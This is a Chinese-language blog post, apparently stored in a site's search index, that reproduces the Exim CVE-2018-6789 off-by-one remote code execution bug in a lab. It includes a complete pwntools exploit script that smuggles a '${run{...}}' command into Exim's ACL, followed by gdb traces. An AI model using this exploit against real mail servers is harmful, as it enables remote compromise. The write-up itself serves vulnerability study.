<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Exim Off by one CVE-2018-6789漏洞复现]]></title>
    <url>%2F2019%2F02%2F16%2FExim-Off-by-one-CVE-2018-6789%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[漏洞原理在base64.c中的b64decode函数，存在off by one的漏洞。下面的代码中，先根据code的长度分配内存。由于在encode时会按照三个字节一组转换为四字节，decode时则是四个字节一组转换为三字节。当code的长度为4n+3时，则会分配3n+1长度的内存。但是参照代码，实际会分配3n+2个字节。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566intb64decode(const uschar *code, uschar **ptr)&#123;int x, y; //漏洞所在uschar *result = store_get(3*(Ustrlen(code)/4) + 1);*ptr = result;/* Each cycle of the loop handles a quantum of 4 input bytes. For the lastquantum this may decode to 1, 2, or 3 output bytes. */while ((x = *code++) != 0) &#123; if (isspace(x)) continue; /* debug_printf("b64d: '%c'\n", x); */ if (x &gt; 127 || (x = dec64table[x]) == 255) return -1; while (isspace(y = *code++)) ; /* debug_printf("b64d: '%c'\n", y); */ if (y == 0 || (y = dec64table[y]) == 255) return -1; *result++ = (x &lt;&lt; 2) | (y &gt;&gt; 4); /* debug_printf("b64d: -&gt; %02x\n", result[-1]); */ while (isspace(x = *code++)) ; /* debug_printf("b64d: '%c'\n", x); */ if (x == '=') /* endmarker, but there should be another */ &#123; while (isspace(x = *code++)) ; /* debug_printf("b64d: '%c'\n", x); */ if (x != '=') return -1; while (isspace(y = *code++)) ; if (y != 0) return -1; /* debug_printf("b64d: DONE\n"); */ break; &#125; else &#123; if (x &gt; 127 || (x = dec64table[x]) == 255) return -1; *result++ = (y &lt;&lt; 4) | (x &gt;&gt; 2); /* debug_printf("b64d: -&gt; %02x\n", result[-1]); */ while (isspace(y = *code++)) ; /* debug_printf("b64d: '%c'\n", y); */ if (y == '=') &#123; while (isspace(y = *code++)) ; if (y != 0) return -1; /* debug_printf("b64d: DONE\n"); */ break; &#125; else &#123; if (y &gt; 127 || (y = dec64table[y]) == 255) return -1; *result++ = (x &lt;&lt; 6) | y; /* debug_printf("b64d: -&gt; %02x\n", result[-1]); */ &#125; &#125; &#125;*result = 0;return result - *ptr;&#125; 1234假设code剩余的3个字节分别是c1,c2,c3.前面的4n个字节被decode为3n个字节。 d1 = c1&lt;&lt;2|c2&gt;&gt;4 d2 = c2&lt;&lt;4|c3&gt;&gt;24n+3 ===&gt; 3n+2 off by one漏洞可以用于堆中对下一个chunk的size的覆写，修改了size就有机会堆溢出，覆盖其他chunk的内容。因此首先了解一下Exim的内存管理机制，方便后续的利用。 Exim的内存管理总述Exim有自己的一套内存管理机制。如下图所示，storeblock结构包含next指针和length，next指向下一块storeblock，length的最小长度为0x2000，storeblock则是由glibc的malloc分配的。这些storeblock以单向链表的形式组织起来，由chainbase记录头结点。yield_length为当前storeblock剩余可用的长度，next_yield指向未被分配的地址。用store_get函数申请内存（下面有详细讲解），申请的大小小于yield_length时就在当前storeblock的next_yield处开始分配；否则就再申请一块新的storeblock。 管理内存的关键函数：1234#define store_free(addr) store_free_3(addr, __FILE__, __LINE__)#define store_get(size) store_get_3(size, __FILE__, __LINE__)#define store_malloc(size) store_malloc_3(size, __FILE__, __LINE__)#define store_reset(addr) store_reset_3(addr, __FILE__, __LINE__) store_get_3函数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889void *store_get_3(int size, const char *filename, int linenumber)&#123;/* Round up the size to a multiple of the alignment. Although this looks amessy statement, because "alignment" is a constant expression, the compiler cando a reasonable job of optimizing, especially if the value of "alignment" is apower of two. I checked this with -O2, and gcc did very well, compiling it to 4instructions on a Sparc (alignment = 8). *///将size调整为以8对齐if (size % alignment != 0) size += alignment - (size % alignment);/* If there isn't room in the current block, get a new one. The minimumsize is STORE_BLOCK_SIZE, and we would expect this to be the norm, sincethese functions are mostly called for small amounts of store. *///如果申请的大小大于当前storeblock剩余大小if (size &gt; yield_length[store_pool]) &#123; //STORE_BLOCK_SIZE为0x2000,ALIGNED_SIZEOF_STOREBLOCK为0x10 int length = (size &lt;= STORE_BLOCK_SIZE)? STORE_BLOCK_SIZE : size; int mlength = length + ALIGNED_SIZEOF_STOREBLOCK; storeblock * newblock = NULL; /* Sometimes store_reset() may leave a block for us; check if we can use it */ //如果当前storeblock有next，且next小于length,释放掉next storeblock if ( (newblock = current_block[store_pool]) &amp;&amp; (newblock = newblock-&gt;next) &amp;&amp; newblock-&gt;length &lt; length ) &#123; /* Give up on this block, because it's too small */ store_free(newblock); newblock = NULL; &#125; /* If there was no free block, get a new one */ //store_malloc申请新的storeblock if (!newblock) &#123; pool_malloc += mlength; /* Used in pools */ nonpool_malloc -= mlength; /* Exclude from overall total */ newblock = store_malloc(mlength); //调用store_malloc分配空间，store_malloc见下文 newblock-&gt;next = NULL; newblock-&gt;length = length; if (!chainbase[store_pool]) chainbase[store_pool] = newblock; else current_block[store_pool]-&gt;next = newblock; &#125; //设置current_block，yield_length,next_yield current_block[store_pool] = newblock; yield_length[store_pool] = newblock-&gt;length; next_yield[store_pool] = (void *)(CS current_block[store_pool] + ALIGNED_SIZEOF_STOREBLOCK); (void) VALGRIND_MAKE_MEM_NOACCESS(next_yield[store_pool], yield_length[store_pool]); &#125;/* There's (now) enough room in the current block; the yield is the nextpointer. *///store_last_get记录最后一次获取内存的地址store_last_get[store_pool] = next_yield[store_pool];/* Cut out the debugging stuff for utilities, but stop picky compilers fromgiving warnings. */#ifdef COMPILE_UTILITYfilename = filename;linenumber = linenumber;#elseDEBUG(D_memory) &#123; if (running_in_test_harness) debug_printf("---%d Get %5d\n", store_pool, size); else debug_printf("---%d Get %6p %5d %-14s %4d\n", store_pool, store_last_get[store_pool], size, filename, linenumber); &#125;#endif /* COMPILE_UTILITY *///从store_last_get指向的内存分配size，并更新next_yield,yield_length(void) VALGRIND_MAKE_MEM_UNDEFINED(store_last_get[store_pool], size);/* Update next pointer and number of bytes left in the current block. */next_yield[store_pool] = (void *)(CS next_yield[store_pool] + size);yield_length[store_pool] -= size;return store_last_get[store_pool];&#125; store_free_3函数除了调试信息之外，是直接调用glibc的free函数进行释放。 1234567891011121314151617voidstore_free_3(void *block, const char *filename, int linenumber)&#123;#ifdef COMPILE_UTILITYfilename = filename;linenumber = linenumber;#elseDEBUG(D_memory) &#123; if (running_in_test_harness) debug_printf("----Free\n"); else debug_printf("----Free %6p %-20s %4d\n", block, filename, linenumber); &#125;#endif /* COMPILE_UTILITY */free(block);&#125; store_malloc_3函数store_malloc函数就是调用glibc的malloc函数分配内存。 1234567891011121314151617void *store_malloc_3(int size, const char *filename, int linenumber)&#123;void *yield;if (size &lt; 16) size = 16;if (!(yield = malloc((size_t)size))) log_write(0, LOG_MAIN|LOG_PANIC_DIE, "failed to malloc %d bytes of memory: " "called from line %d of %s", size, linenumber, filename);nonpool_malloc += size;……return yield;&#125; store_reset_3函数该函数释放除指定ptr所在storeblock之外的其他storeblock。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970voidstore_reset_3(void *ptr, const char *filename, int linenumber)&#123;storeblock * bb;storeblock * b = current_block[store_pool];char * bc = CS b + ALIGNED_SIZEOF_STOREBLOCK;int newlength;/* Last store operation was not a get */store_last_get[store_pool] = NULL;/* See if the place is in the current block - as it often will be. Otherwise,search for the block in which it lies. */if (CS ptr &lt; bc || CS ptr &gt; bc + b-&gt;length) &#123; //从chainbase开始查找ptr所在的storeblock for (b = chainbase[store_pool]; b; b = b-&gt;next) &#123; bc = CS b + ALIGNED_SIZEOF_STOREBLOCK; if (CS ptr &gt;= bc &amp;&amp; CS ptr &lt;= bc + b-&gt;length) break; &#125; if (!b) log_write(0, LOG_MAIN|LOG_PANIC_DIE, "internal error: store_reset(%p) " "failed: pool=%d %-14s %4d", ptr, store_pool, filename, linenumber); &#125;/* Back up, rounding to the alignment if necessary. When testing, flattenthe released memory. *///设置current block为ptr所在的storeblock，yield_length为newlength，next_yield为ptrnewlength = bc + b-&gt;length - CS ptr;……(void) VALGRIND_MAKE_MEM_NOACCESS(ptr, newlength);yield_length[store_pool] = newlength - (newlength % alignment);next_yield[store_pool] = CS ptr + (newlength % alignment);current_block[store_pool] = b;/* Free any subsequent block. Do NOT free the first successor, if ourcurrent block has less than 256 bytes left. This should prevent us fromflapping memory. However, keep this block only when it has the default size. *///如果yield_length&lt;256，并且有next，并且next的大小为0x2000,就保留next storeblockif (yield_length[store_pool] &lt; STOREPOOL_MIN_SIZE &amp;&amp; b-&gt;next &amp;&amp; b-&gt;next-&gt;length == STORE_BLOCK_SIZE) &#123; b = b-&gt;next; …… (void) VALGRIND_MAKE_MEM_NOACCESS(CS b + ALIGNED_SIZEOF_STOREBLOCK, b-&gt;length - ALIGNED_SIZEOF_STOREBLOCK); &#125;bb = b-&gt;next;b-&gt;next = NULL;//释放b之后的所有Storeblockwhile ((b = bb)) &#123;#ifndef COMPILE_UTILITY if (running_in_test_harness || debug_store) assert_no_variables(b, b-&gt;length + ALIGNED_SIZEOF_STOREBLOCK, filename, linenumber);#endif bb = bb-&gt;next; pool_malloc -= b-&gt;length + ALIGNED_SIZEOF_STOREBLOCK; store_free_3(b, filename, linenumber); &#125;……&#125; 在了解了以上几个管理内存的函数后，继续研究在Exim中的哪些环节调用了这些函数，进而能够理解exp中的操作。 Exim中调用内存管理的关键函数Exim启动时执行main函数，在main中调用daemo_go，在daemo_go中调用smtp_setup_msg处理客户端的命令，每次用smtp_read_command读取命令，然后根据不同的情况进行处理。 smtp_setup_msg是Exim服务器端比较关键的函数，主要流程的简化代码为： 12345678910111213141516171819202122232425262728293031smtp_setup_msg()&#123; int done = 0; void *reset_pointer = store_get(0); smtp_reset(reset_pointer); …… while(done&lt;=0)&#123; …… switch(smtp_read_command(TRUE, GETC_BUFFER_UNLIMITED))&#123; case AUTH_CMD: …… break; case HELO_CMD: …… goto HELO_EHLO; case EHLO_CMD: …… goto HELO_EHLO; HELO_EHLO: if (!check_helo(smtp_cmd_data)) …… smtp_reset(reset_pointer); break; …… default： …… done = synprot_error(L_smtp_syntax_error, 500, NULL,US"unrecognized command"); break; &#125; &#125;&#125; 上面列出的部分就是与内存相关的函数，下面一一介绍。 smtp_reset函数smtp_reset最主要的就是调用了store_reset函数，用于释放storeblock。源码这里就不放了，位于smtp_in.c中。 在HELO/EHLO，MAIL，RCPT命令处理结束后，都会调用该函数。 check_helo函数check_helo对smtp_cmd_data进行字符的检查，包含了对sender_helo_name指向空间的释放（store_free）和重新分配（store_malloc）。该函数调用与EHLO/HELO命令中。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354static BOOLcheck_helo(uschar *s)&#123;uschar *start = s;uschar *end = s + Ustrlen(s);BOOL yield = helo_accept_junk;/* Discard any previous helo name *///如果sender_helo_name不为空，释放所指内存并置空if (sender_helo_name != NULL) &#123; store_free(sender_helo_name); sender_helo_name = NULL; &#125;/* Skip tests if junk is permitted. */if (!yield) /* Allow the new standard form for IPv6 address literals, namely, [IPv6:....], and because someone is bound to use it, allow an equivalent IPv4 form. Allow plain addresses as well. */ if (*s == '[') &#123; …… &#125; /* Non-literals must be alpha, dot, hyphen, plus any non-valid chars that have been configured (usually underscore - sigh). */ else if (*s) for (yield = TRUE; *s; s++) if (!isalnum(*s) &amp;&amp; *s != '.' &amp;&amp; *s != '-' &amp;&amp; Ustrchr(helo_allow_chars, *s) == NULL) &#123; yield = FALSE; break; &#125;/* Save argument if OK *///重新分配内存给sender_helo_nameif (yield) sender_helo_name = string_copy_malloc(start);return yield;&#125;uschar *string_copy_malloc(const uschar *s)&#123;int len = Ustrlen(s) + 1;uschar *ss = store_malloc(len);//调用store_mallocmemcpy(ss, s, len);return ss;&#125; synprot_error函数处理unknown cmd当用户输入的命令为未知命令时，会进入到default分支，调用synprot_error处理unknown cmd。 synprot_error中调用string_printing处理输入的unknown cmd，为之分配（store_get）空间。 1234567891011121314151617181920212223242526272829303132333435363738394041static intsynprot_error(int type, int code, uschar *data, uschar *errmess)&#123;int yield = -1;log_write(type, LOG_MAIN, "SMTP %s error in \"%s\" %s %s", (type == L_smtp_syntax_error)? "syntax" : "protocol", string_printing(smtp_cmd_buffer), host_and_ident(TRUE), errmess);……return yield;&#125;#define string_printing(s) string_printing2((s), TRUE)const uschar *string_printing2(const uschar *s, BOOL allow_tab)&#123; //s即为unknown cmdint nonprintcount = 0;int length = 0;const uschar *t = s;uschar *ss, *tt;while (*t != 0) &#123; int c = *t++; //nonprintcount为不可打印字符的个数 if (!mac_isprint(c) || (!allow_tab &amp;&amp; c == '\t')) nonprintcount++; length++; &#125;if (nonprintcount == 0) return s;/* Get a new block of store guaranteed big enough to hold theexpanded string. *///为unknown cmd分配空间，当输入的都是不可打印字符时，store_get的参数为4*length+1ss = store_get(length + nonprintcount * 3 + 1);……&#125; auth_cram_md5_server在输入AUTH命令时，auth_cram_md5_server函数会被调用。源码中没有体现出来，但是在调试时候能够看见，可能是通过指针调用的。auth_cram_md5_server采用base64编码对数据进行传输，就会调用b64decode。off by one的漏洞就通过AUTH命令来处理。 1234567► f 0 465966 store_get_3 f 1 409bf3 b64decode+68 f 2 4832ff auth_cram_md5_server+191 f 3 45f306 smtp_setup_msg+2031 f 4 40d1d0 daemon_go+9509 f 5 4225e9 main+21198 f 6 7f57f4458830 __libc_start_main+240 在有了以上知识之后，就能够比较容易的理解漏洞利用的方法。接下来进入实战环节，对漏洞进行复现。 漏洞利用EXP把EXP放在这个位置，目的是先在理论层面理解漏洞利用的方法，接着通过gdb调试来对理论进行验证。 脚本来自skysider 并根据环境修改了一点点。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *import timefrom base64 import b64encodefrom threading import Thread def ehlo(tube, who): time.sleep(0.2) tube.sendline("ehlo "+who) tube.recv() def docmd(tube, command): time.sleep(0.2) tube.sendline(command) tube.recv() def auth(tube, command): time.sleep(0.2) tube.sendline("AUTH CRAM-MD5") tube.recv() time.sleep(0.2) tube.sendline(command) tube.recv() def execute_command(): global ip ip = "127.0.0.1" command="/usr/bin/touch /tmp/success" context.log_level='warning' s = remote(ip, 25) # 1. put a huge chunk into unsorted bin log.info("send ehlo") ehlo(s, "a"*0x1000) # 0x2020 raw_input("after 0x1000") ehlo(s, "a"*0x20) raw_input("after 0x20") # 2. cut the first storeblock by unknown command log.info("send unknown command") docmd(s, "\xee"*0x700) raw_input("after 0x700") # 3. cut the second storeblock and release the first one log.info("send ehlo again to cut storeblock") ehlo(s, "c"*0x2c00) raw_input("after 0x2c00") # 4. send base64 data and trigger off-by-one log.info("overwrite one byte of next chunk") docmd(s, "AUTH CRAM-MD5") payload1 = "d"*(0x2020+0x30-0x18-1) docmd(s, b64encode(payload1)+"EfE") raw_input("after payload1") # 5. forge chunk size log.info("forge chunk size") docmd(s, "AUTH CRAM-MD5") payload2 = 'm'*0x78+p64(0x1f41) docmd(s, b64encode(payload2)) raw_input("after payload2") # 6. release extended chunk log.info("resend ehlo") ehlo(s, "skysider+") raw_input("after release extended chunk") # 7. overwrite next pointer of overlapped storeblock log.info("overwrite next pointer of overlapped storeblock") docmd(s, "AUTH CRAM-MD5") try_addr = 0x1a3e490 payload3 = 'a'*0x2bf0 + p64(0x0) + p64(0x2021) +p64(try_addr)+p64(0x2000) try: docmd(s, b64encode(payload3)) raw_input("after payload3") # 8. reset storeblocks and retrive the ACL storeblock log.info("reset storeblock") ehlo(s, "crashed") raw_input("after realease storeblock") # 9. overwrite acl strings log.info("overwrite acl strings") payload4 = 'a'*0x18 + p64(0xb1) + 't'*(0xb0-0x10) + p64(0xb0) + p64(0x1f40) payload4 += 't'*(0x1f80-len(payload4)) auth(s, b64encode(payload4)+'ee') raw_input("after payload4") payload5 = "a"*0x80 + "$&#123;run&#123;" + command + "&#125;&#125;\x00" auth(s, b64encode(payload5)+"ee") raw_input("after payload5") # 10. trigger acl check log.info("trigger acl check and execute command") s.sendline("MAIL FROM: &lt;test@163.com&gt;") s.close() return 1 except: s.close() return 0 if __name__ == '__main__': execute_command() 漏洞利用思路漏洞利用的思路为：构造三个chunk，第一块用于off by one修改第二块的size；第二块用于修改size后溢出修改掉下一块的next指针；第三块用于伪造躲过free检查的chunk以及提供被修改的next指针。修改掉next为acl_check_mail之后，通过smtp_reset将next指向的storeblock放入unsortedbin，并通过再次分配，覆写掉acl_check_mail中的字符串为要执行的cmd，最后触发acl_check执行cmd。 环境配置环境配置主要是按照skysider的Dockerfile进行配置的（但并没有用Docker，只是用了Dockerfile里的命令），也结合了其他师傅的blog。 12345678910111213#安装依赖库（总结了几个博客中的库，都安上了$apt install libpcre++-dev libdb-dev libxt-dev libxaw7-dev libssl-dev libpcre3-dev#下载exim源码$wget https://github.com/Exim/exim/releases/download/exim-4_89/exim-4.89.tar.xz$tar xf exim-4.89.tar.xz &amp;&amp; cd exim-4.89$cp src/EDITME Local/Makefile &amp;&amp; cp exim_monitor/EDITME Local/eximon.conf#手动修改Makefile中的第134行EXIM_USER为当前用户(我的是test),625行 AUTH_CRAM_MD5=yes#编译$make$sudo make install#手动修改/usr/exim/configure文件中第364行的accept hosts=:为accept hosts=* 安装完成后，以conf.conf文件作为配置文件运行exim： 1$/usr/exim/bin/exim -bd -d-receive -C docker/conf.conf 复现过程设置的断点为： 12345b check_helob smtp_resetb b64decodeb store_get_3b store_free_3 调试的方法是在exp里加入了raw_input辅助调试，起到让程序暂停的功能；另起一个python，用gdb.attach（pid）连上服务器端的子进程。 Step 1ehlo 0x1000 check_helo：store_malloc(0x1000) smtp_reset 无 123456789101112131415pwndbg&gt; unsortedbinunsortedbinall: 0x1a5e770 —▸ 0x7f57f47fcb78 (main_arena+88) ◂— 0x1a5e770pwndbg&gt; x/8gx 0x1a5e7700x1a5e770: 0x0000000000000000 0x00000000000060610x1a5e780: 0x00007f57f47fcb78 0x00007f57f47fcb780x1a5e790: 0x0000000000000000 0x00000000000000000x1a5e7a0: 0x6161616161616161 0x6161616161616161pwndbg&gt; x/8gx 0x1a5e770-0x10100x1a5d760: 0x0000000000000000 0x00000000000010110x1a5d770: 0x6161616161616161 0x61616161616161610x1a5d780: 0x6161616161616161 0x61616161616161610x1a5d790: 0x6161616161616161 0x6161616161616161#ehlo后sender_helo_name的返回的地址是0x1a5d760,后面是一个0x6060的unsortedbin 关于这个0x6060的unsoredbin是怎么来的，是因为EHLO命令在check_helo之后还有一些其他的处理，调用了store_get，在EHLO命令结束之前调用了smtp_reset，将这些storeblock释放掉了，几个连续的storeblock合并成了中国unsoretedbin。这里简单列出几个函数，主要是match_isinlist和host_build_sender_fullhost，而且每个会重复几遍。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849 ► f 0 465966 store_get_3 f 1 46687f string_copy+42 f 2 467f17 string_sprintf+250 f 3 43b5dd match_check_list+170 f 4 43ca7d match_isinlist+199 f 5 45f7ec smtp_setup_msg+3285 f 6 40d1d0 daemon_go+9509 f 7 4225e9 main+21198 f 8 7f57f4458830 __libc_start_main+240 ► f 0 465966 store_get_3 f 1 46687f string_copy+42 f 2 467f17 string_sprintf+250 f 3 4359ce host_build_sender_fullhost+83 f 4 45f7fe smtp_setup_msg+3303 f 5 40d1d0 daemon_go+9509 f 6 4225e9 main+21198 f 7 7f57f4458830 __libc_start_main+240 ► f 0 465966 store_get_3 f 1 466f14 string_catn+97 f 2 435bbb host_build_sender_fullhost+576 f 3 45f7fe smtp_setup_msg+3303 f 4 40d1d0 daemon_go+9509 f 5 4225e9 main+21198 f 6 7f57f4458830 __libc_start_main+240 ► f 0 465966 store_get_3 f 1 46687f string_copy+42 f 2 467f17 string_sprintf+250 f 3 45f9d5 smtp_setup_msg+3774 f 4 40d1d0 daemon_go+9509 f 5 4225e9 main+21198 f 6 7f57f4458830 __libc_start_main+240 ► f 0 465966 store_get_3 f 1 46687f string_copy+42 f 2 467f17 string_sprintf+250 f 3 43b5dd match_check_list+170 f 4 470888 verify_check_this_host+168 f 5 4708fb verify_check_host+44 f 6 45fc4f smtp_setup_msg+4408 f 7 40d1d0 daemon_go+9509 f 8 4225e9 main+21198 f 9 7f57f4458830 __libc_start_main+240…… ​ ehlo 0x20 check_helo：store_free(0x1a5d760)释放后与unsortedbin合并，即unsortedbin为0x1a5d760 ​ store_malloc(0x30) 返回0x1a5d760，unsortedbin为0x1a5d790 smtp_reset 无 12unsortedbinall: 0x1a5d790 —▸ 0x7f57f47fcb78 (main_arena+88) ◂— 0x1a5d790 Step 2unknown cmd 0x700 在string_printing2里，为未知的命令分配了4*length+1的空间。这里是0x700*4+1=0x1c01，即store_get(0x1c01)。由于yield_length够，因此在store_get_3里用store_malloc分配了一个0x2000的storeblock，是从刚才的unsoredbin中分配的。 123456789101112131415161718 ► f 0 465966 store_get_3 f 1 46662a string_printing2+136 f 2 45c77a synprot_error+49 f 3 462284 smtp_setup_msg+14189 f 4 40d1d0 daemon_go+9509 f 5 4225e9 main+21198 f 6 7f57f4458830 __libc_start_main+240Breakpoint store_get_3pwndbg&gt; i r rdirdi 0x1c01 7169pwndbg&gt; p yield_length$1 = 7048……pwndbg&gt; i r rax #finish之后返回值为0x1a5d7b0rax 0x1a5d7b0 27645872pwndbg&gt; unsortedbinunsortedbinall: 0x1a5f7b0 —▸ 0x7f57f47fcb78 (main_arena+88) ◂— 0x1a5f7b0 Step 3ehlo 0x2c00 check_helo：store_free(0x1a5d760) ​ store_malloc(0x2c00) 返回0x1a5f7b0，unsortedbin为0x1a623c0 smtp_reset：释放unknown cmd 0x1a5d7b0，释放时和前面的0x30合并了（中间夹杂了其他复杂的过程）变成0x1a5d760 123pwndbg&gt; unsortedbinunsortedbinall: 0x1a623c0 —▸ 0x1a68810 —▸ 0x1a5d760 —▸ 0x7f57f47fcb78 (main_arena+88) ◂— 0x1a623c0 Step 4AUTH 0X2050， off by one AUTH命令过程中有一些其他的store_get，但size都比较小，从原storeblock分配了。 客户端发送的字节长度为0x2AF7，根据前面b64decode的代码，会分配0x2AF7/4*3+1 = 0x2038字节，但实际解码时候需要0x2039字节，调用store_get(0x2038)，分配0x2050，返回地址为0x1a5d780，产生的off by one，覆盖到下一块的size最后一字节。 12345678910111213141516171819202122232425262728293031 ► f 0 465966 store_get_3 f 1 409bf3 b64decode+68 f 2 4832ff auth_cram_md5_server+191 f 3 45f306 smtp_setup_msg+2031 f 4 40d1d0 daemon_go+9509 f 5 4225e9 main+21198 f 6 7f57f4458830 __libc_start_main+240Breakpoint store_get_3pwndbg&gt; i r rdirdi 0x2038 8248pwndbg&gt; unsortedbinunsortedbinall: 0x1a623c0 —▸ 0x1a68810 —▸ 0x1a5d760 —▸ 0x7f57f47fcb78 (main_arena+88) ◂— 0x1a623c0……pwndbg&gt; i r raxrax 0x1a5d780 27645824pwndbg&gt; x/8gx 0x1a5d780-0x10-0x100x1a5d760: 0x0000000000000000 0x00000000000020510x1a5d770: 0x0000000000000000 0x00000000000020380x1a5d780: 0x6464646464646464 0x64646464646464640x1a5d790: 0x6464646464646464 0x6464646464646464pwndbg&gt; x/8gx 0x1a5d760+0x2050 #下一块大小已经被覆盖为0x2cf10x1a5f7b0: 0x1164646464646464 0x0000000000002cf10x1a5f7c0: 0x6363636363636363 0x63636363636363630x1a5f7d0: 0x6363636363636363 0x63636363636363630x1a5f7e0: 0x6363636363636363 0x6363636363636363 pwndbg&gt; unsortedbinunsortedbinall: 0x1a623c0 —▸ 0x1a68810 —▸ 0x7f57f47fcb78 (main_arena+88) AUTH在b64decode之后还有一些额外的store_get（例如expand_string函数中），会重新分配一个0x2000大小的storeblock，由于0x1a68810的大小是0xb0a0虽然大于0x2000但不是last remainder，所以被丢进了largebin，于是从0x1a623c0分的。(中间的0x1a68810不知道是怎么进入到large bin里，没有被分配) 12345pwndbg&gt; i r raxrax 0x1a623e0 27665376pwndbg&gt; unsortedbinunsortedbinall: 0x1a643e0 —▸ 0x7f57f47fcb78 (main_arena+88) ◂— 0x1a643e0 expand_string的一些小块就都在这个0x1a623c0中分配。 Step 5AUTH构造fake chunk 构造fake chunk的目的在于，当0x2cf0大小的块被释放时，free会检查下一块的inuse位（确定本块是否已释放）以及下下一块的inuse（确定下一块是否空闲） 同上一步一样，b64decode之前有一些小块的分配，都从0x1a623c0中分配。在b64decode之前，next_yield为0x1a62430。 12pwndbg&gt; x/8gx 0x6bfb800x6bfb80 &lt;next_yield&gt;: 0x0000000001a62430 0x0000000001a79118 由于0x20f0的chunk地址为0x1a5f7b0，被修改之后的chunk结尾为0x1a624a0。距离next_yield 0x1a62430还有0x70的填充长度，则距离fake size为0x78的长度。 当AUTH发送的内容为’m’*0x78+p64(0x1f41)时，b64decode的store_get将从0x1a624a0开始分配0x80的长度，成功将假的下一块的size写为0x1f41。 Step 6ehlo skysider+ check_helo：store_free(0x1a5f7b0) 这里的+会在check_helo中导致提前退出，没有store_malloc。 1234567for (yield = TRUE; *s; s++) if (!isalnum(*s) &amp;&amp; *s != '.' &amp;&amp; *s != '-' &amp;&amp; Ustrchr(helo_allow_chars, *s) == NULL) &#123; yield = FALSE; break; &#125; 而在check_helo返回FALSE时，也会提前退出，没有smtp_reset 12345678910111213if (!check_helo(smtp_cmd_data)) &#123; smtp_printf("501 Syntactically invalid %s argument(s)\r\n", FALSE, hello); log_write(0, LOG_MAIN|LOG_REJECT, "rejected %s from %s: syntactically " "invalid argument(s): %s", hello, host_and_ident(FALSE), (*smtp_cmd_argument == 0)? US"(no argument given)" : string_printing(smtp_cmd_argument)); …… break; &#125; 123pwndbg&gt; unsortedbinunsortedbinall: 0x1a5f7b0 —▸ 0x1a64470 —▸ 0x7f57f47fcb78 (main_arena+88) ◂— 0x1a5f7b0 Step 7AUTH 覆写0x1a623b0的next指针 使用MAIL FROM时，acl_check会对每个配置进行检查，这个过程中会调用expand_string，而如果expand_string的参数为${run${cmd}}，就会执行cmd，具体调用如下： acl_check-&gt;acl_check_internal-&gt;expand_string-&gt;child_open-&gt;execv 我们在conf.conf中指定了acl_smtp_mail=acl_check_mail。如果能够将acl_check_mail所在位置的字符串修改为${run${cmd}}形式，就能执行命令了。这里是将next指针修改为acl_check_mail地址所属的storeblock，这样在smtp_reset时会把这个storeblock放入unsortedbin，当再次分配时就能向acl_check_mail字符串地址中写入命令，完成利用。 123456789101112131415pwndbg&gt; x/8gx &amp;acl_smtp_mail0x6bf360 &lt;acl_smtp_mail&gt;: 0x0000000001a3e520 0x00000000000000000x6bf370 &lt;acl_smtp_expn&gt;: 0x0000000000000000 0x00000000000000000x6bf380 &lt;acl_smtp_data&gt;: 0x0000000001a3e530 0x00000000000000000x6bf390 &lt;acl_smtp_auth&gt;: 0x0000000000000000 0x0000000000000000……#0x1a3e520本来是字符串"acl_check_mail",试图修改为cmd#该堆块的起始头尾0x1a3e480,可将next覆写为这个地址+0x10（即为storeblock的起始地址)，能够躲过free的检查#修改了next指针pwndbg&gt; x/8gx 0x1a623c00x1a623c0: 0x0000000000000000 0x00000000000020210x1a623d0: 0x0000000001a3e490 0x00000000000020000x1a623e0: 0x0000000001a62300 0x00000000000000c10x1a623f0: 0x00007f57f47fcb78 0x00007f57f47fcb78 Step 8ehlo crashed 目的在于EHLO命令结束之前的smtp_reset，会将acl_check_mail所在的storeblock释放到unsortedbin中。 1234567891011121314151617181920#reset之前的chainbase：pwndbg&gt; x/8gx 0x6bfbc00x6bfbc0 &lt;chainbase&gt;: 0x0000000001a4fa40 0x0000000001a3e490……pwndbg&gt; x/8gx 0x0000000001a4fa400x1a4fa40: 0x0000000001a5d770 0x0000000000002000……pwndbg&gt; x/8gx 0x0000000001a5d7700x1a5d770: 0x0000000001a623d0 0x0000000000002038……pwndbg&gt; x/8gx 0x0000000001a623d00x1a623d0: 0x0000000001a3e490 0x0000000000002000……#即0x1a4fa40-&gt;0x1a5d770(0x2050)-&gt;0x1a623d0(0x2020)-&gt;0x1a3e490#reset结束后，ub为pwndbg&gt; unsortedbinunsortedbinall: 0x1a72ca0 —▸ 0x1a64470 —▸ 0x1a43130 —▸ 0x1a3e480 —▸ 0x1a623c0 —▸ 0x1a5d760 —▸ 0x7f57f47fcb78 (main_arena+88) ​ Step 9目的在于分配acl_check_mail之前的两个unsortedbin。store_get(0x1f80)，会分配一个最小的storeblock。0x1a5d760的大小为0x2050，虽然大于0x2020但并不是lastremainder，所以被扔进了largebin。结束后的ub，acl_check_mail所在的storeblock位于第一块 123pwndbg&gt; unsortedbinunsortedbinall: 0x1a72ca0 —▸ 0x1a64470 —▸ 0x1a43130 —▸ 0x1a3e480 —▸ 0x7f57f47fcb78 (main_arena+88) 继续通过AUTH分配掉0x1a3e480，并写入cmd 123456789#b64decode的store_get_3返回：pwndbg&gt; i r raxrax 0x1a3e4a0 27518112pwndbg&gt; x/s 0x1a3e4a0+0x800x1a3e520: "acl_check_mail"pwndbg&gt; finish#finish b64decodepwndbg&gt; x/s 0x1a3e4a0+0x800x1a3e520: "$&#123;run&#123;/usr/bin/"... Step 10MAIL FROM命令触发acl_check。 12test@ubuntu:/tmp$ ls -al|grep success-rw------- 1 test test 0 Feb 15 01:13 success 总结遇到难懂的问题，可以先去源码里找答案，再搞不懂的，就gdb调起来。 参考链接https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/ http://blog.leanote.com/post/mut3p1g/exim-CVE-2018-6789-%E5%88%86%E6%9E%90-2 https://bbs.pediy.com/thread-225986.htm https://github.com/skysider/VulnPOC/tree/master/CVE-2018-6789 